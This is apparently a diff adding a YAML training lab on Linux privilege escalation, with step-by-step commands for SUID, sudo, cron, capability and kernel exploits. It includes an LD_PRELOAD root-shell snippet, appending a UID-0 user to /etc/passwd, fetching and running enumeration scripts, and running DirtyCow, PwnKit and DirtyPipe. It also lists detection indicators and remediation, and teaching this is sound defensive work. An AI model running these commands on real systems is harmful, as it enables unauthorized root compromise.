@@ -1,0 +1,242 @@
+# Category: Offensive Security - Privilege Escalation - Linux
+name: "Linux Privilege Escalation Techniques"
+id: "privesc-linux-001"
+category: "privilege_escalation"
+subcategory: "linux"
+difficulty: "intermediate"
+estimated_time: "90 minutes"
+
+description: |
+  Enumerate and exploit common Linux privilege escalation vectors to move from a
+  low-privilege shell to root. Covers SUID binaries, sudo misconfigurations,
+  writable cron jobs, capabilities, and kernel exploits.
+
+learning_objectives:
+  - Systematically enumerate Linux privilege escalation vectors
+  - Exploit SUID/SGID binaries using GTFOBins
+  - Abuse sudo misconfigurations for root access
+  - Identify and exploit writable cron jobs and service files
+
+tools:
+  - linpeas
+  - linenum
+  - linux_exploit_suggester
+  - pspy
+  - gtfobins
+  - gcc
+
+prerequisites:
+  - Low-privilege shell on target Linux system
+  - Understanding of Linux file permissions and process model
+  - Network connectivity for tool transfer (or manual enumeration)
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Run automated Linux enumeration with LinPEAS"
+    commands:
+      - "# Transfer LinPEAS to target"
+      - "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh"
+      - "chmod +x /tmp/linpeas.sh"
+      - "# Run full scan"
+      - "/tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt"
+      - "# Run without colour for log analysis"
+      - "/tmp/linpeas.sh -a 2>/dev/null | ansi2txt > /tmp/linpeas_clean.txt"
+      - "# Quick checks only"
+      - "/tmp/linpeas.sh -q 2>/dev/null"
+    expected_output: "Color-coded report highlighting high/medium confidence privilege escalation paths"
+    detection: "LinPEAS execution in process logs; find commands executed by low-priv user"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Manual system enumeration"
+    commands:
+      - "# OS and kernel version"
+      - "uname -a && cat /etc/os-release"
+      - "# Current user context"
+      - "id && whoami && groups"
+      - "# Sudo privileges"
+      - "sudo -l"
+      - "# SUID/SGID binaries"
+      - "find / -perm -4000 -type f 2>/dev/null"
+      - "find / -perm -2000 -type f 2>/dev/null"
+      - "# World-writable directories"
+      - "find / -writable -type d 2>/dev/null | grep -v '/proc\\|/sys\\|/dev'"
+      - "# Capabilities"
+      - "getcap -r / 2>/dev/null"
+      - "# Cron jobs"
+      - "cat /etc/crontab && ls -la /etc/cron.*"
+      - "crontab -l"
+      - "# Running processes (check for root processes running scripts)"
+      - "ps aux | grep root"
+    expected_output: "Comprehensive list of potential escalation vectors"
+    detection: "find commands with -perm flags; getcap and sudo -l in bash history"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "SUID binary exploitation via GTFOBins"
+    commands:
+      - "# Check SUID binaries against GTFOBins"
+      - "find / -perm -4000 -type f 2>/dev/null | xargs ls -la"
+      - "# Example: bash SUID"
+      - "/bin/bash -p"
+      - "# Example: vim SUID"
+      - "vim -c ':!/bin/bash -p'"
+      - "# Example: find SUID"
+      - "find . -exec /bin/bash -p \\;"
+      - "# Example: python SUID"
+      - "python3 -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'"
+      - "# Example: nmap SUID (older versions)"
+      - "nmap --interactive"
+      - "!sh"
+      - "# Example: cp SUID — overwrite /etc/passwd"
+      - "openssl passwd -1 -salt xyz hacked123"
+      - "echo 'hacker:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /tmp/passwd"
+      - "cp /tmp/passwd /etc/passwd"
+    expected_output: "Root shell via SUID binary exploitation"
+    detection: "Unexpected SUID binary execution; /etc/passwd modification; root shell spawned"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Sudo misconfiguration exploitation"
+    commands:
+      - "# Check sudo permissions"
+      - "sudo -l"
+      - "# NOPASSWD sudo for specific binary — check GTFOBins"
+      - "# Example: sudo vim"
+      - "sudo vim -c ':!/bin/bash'"
+      - "# Example: sudo find"
+      - "sudo find /bin -name bash -exec /bin/bash \\;"
+      - "# Example: sudo python3"
+      - "sudo python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+      - "# Example: sudo less/man"
+      - "sudo less /etc/passwd"
+      - "!/bin/bash"
+      - "# Example: sudo LD_PRELOAD exploit"
+      - "cat > /tmp/exploit.c << 'EOF'\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setuid(0);\n    setgid(0);\n    system(\"/bin/bash -p\");\n}\nEOF"
+      - "gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles"
+      - "sudo LD_PRELOAD=/tmp/exploit.so [any_allowed_sudo_binary]"
+    expected_output: "Root shell via sudo misconfiguration or LD_PRELOAD abuse"
+    detection: "sudo -l execution; LD_PRELOAD in sudo environment; unexpected bash spawned as root"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "Writable cron job or script exploitation"
+    commands:
+      - "# Find world-writable cron scripts"
+      - "ls -la /etc/cron* /var/spool/cron/*"
+      - "# Monitor processes with pspy to find cron execution"
+      - "chmod +x /tmp/pspy64 && /tmp/pspy64 -pf -i 1000"
+      - "# If a root cron job runs a writable script"
+      - "echo 'chmod +s /bin/bash' >> /path/to/writable_script.sh"
+      - "# Wait for cron execution, then:"
+      - "/bin/bash -p"
+      - "# PATH hijacking in cron"
+      - "# If cron uses relative paths without full path"
+      - "echo 'chmod +s /bin/bash' > /tmp/vulnerable_command"
+      - "chmod +x /tmp/vulnerable_command"
+      - "export PATH=/tmp:$PATH"
+    expected_output: "SUID set on /bin/bash or reverse shell via cron execution"
+    detection: "pspy process monitoring; /bin/bash permission change; new SUID binary"
+
+  - id: "step6"
+    phase: "exploitation"
+    action: "Linux capabilities exploitation"
+    commands:
+      - "# Find binaries with dangerous capabilities"
+      - "getcap -r / 2>/dev/null"
+      - "# cap_setuid — arbitrary UID change"
+      - "# Example: python3 with cap_setuid+ep"
+      - "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
+      - "# cap_net_raw — raw socket (can be used for sniffing)"
+      - "# cap_sys_ptrace — process tracing (can inject into root processes)"
+      - "# Example: gdb with cap_sys_ptrace"
+      - "gdb -p [root_process_pid]"
+      - "call (void)system(\"/bin/bash -c 'chmod +s /bin/bash'\")"
+      - "# perl with cap_setuid"
+      - "perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/bash -p\";'"
+    expected_output: "Root shell via capability-enabled binary"
+    detection: "getcap execution; POSIX capability abuse in process logs"
+
+  - id: "step7"
+    phase: "exploitation"
+    action: "Kernel exploit — identify and run"
+    commands:
+      - "# Identify kernel version"
+      - "uname -r"
+      - "cat /proc/version"
+      - "# Run Linux Exploit Suggester"
+      - "curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o /tmp/les.sh"
+      - "chmod +x /tmp/les.sh && /tmp/les.sh"
+      - "# Common kernel exploits by version"
+      - "# DirtyCow (CVE-2016-5195) — Linux < 4.8.3"
+      - "gcc -pthread /tmp/dirty.c -o /tmp/dirty -lcrypt"
+      - "/tmp/dirty [new_root_password]"
+      - "# PwnKit / PKEXEC (CVE-2021-4034)"
+      - "gcc -o /tmp/pwnkit /tmp/cve-2021-4034.c"
+      - "/tmp/pwnkit"
+      - "# DirtyPipe (CVE-2022-0847) — Linux 5.8-5.16.11"
+      - "gcc -o /tmp/dirtypipe /tmp/dirtypipe.c"
+      - "/tmp/dirtypipe /etc/passwd"
+    expected_output: "Root shell via kernel vulnerability exploitation"
+    detection: "Kernel exploit execution signatures in process logs; unexpected setuid calls"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1548.001"
+    description: "Abuse Elevation Control: Setuid and Setgid"
+  - standard: "MITRE ATT&CK"
+    control: "T1053.003"
+    description: "Scheduled Task/Job: Cron"
+  - standard: "CIS Controls v8"
+    control: "5.4"
+    description: "Restrict administrator privileges to dedicated accounts"
+  - standard: "NIST 800-53 Rev5"
+    control: "AC-6"
+    description: "Least privilege"
+
+detection:
+  network_indicators:
+    - "N/A — local privilege escalation"
+  log_indicators:
+    - "Auditd: execve of SUID binaries by non-root users"
+    - "Auditd: sudo -l and sudo executions"
+    - "Auth.log: sudo session opened for root"
+    - "Syslog: cron executing scripts with elevated privileges"
+  endpoint_indicators:
+    - "LinPEAS/LinEnum execution in process list"
+    - "Unexpected SUID bit set on /bin/bash or other binaries"
+    - "New entries in /etc/passwd with UID 0"
+
+remediation:
+  immediate:
+    - "Audit and remove unnecessary SUID/SGID bits from binaries"
+    - "Review sudo configurations — remove NOPASSWD where not required"
+    - "Restrict cron job scripts to root-owned, non-world-writable files"
+    - "Apply kernel patches and OS updates"
+  long_term:
+    - "Implement AppArmor or SELinux mandatory access controls"
+    - "Remove unnecessary Linux capabilities from binaries"
+    - "Deploy endpoint detection for SUID execution and sudo abuse"
+    - "Regular CIS benchmark compliance checks"
+
+variables:
+  target_ip: "10.10.10.100"
+  low_priv_user: "www-data"
+
+assessment_questions:
+  - "What does the -p flag do when running /bin/bash after SUID exploitation?"
+  - "How does LD_PRELOAD sudo exploitation work?"
+  - "What is pspy used for in Linux privilege escalation?"
+  - "How do Linux capabilities differ from SUID for privilege escalation?"
+  - "Which kernel CVE is known as DirtyCow and what kernel versions are affected?"
+
+references:
+  - url: "https://github.com/carlospolop/PEASS-ng"
+    title: "LinPEAS - Linux Privilege Escalation Awesome Script"
+  - url: "https://gtfobins.github.io/"
+    title: "GTFOBins - Unix Binary Exploitation"
+  - url: "https://github.com/mzet-/linux-exploit-suggester"
+    title: "Linux Exploit Suggester"
+  - url: "https://book.hacktricks.xyz/linux-hardening/privilege-escalation"
+    title: "HackTricks Linux Privilege Escalation"
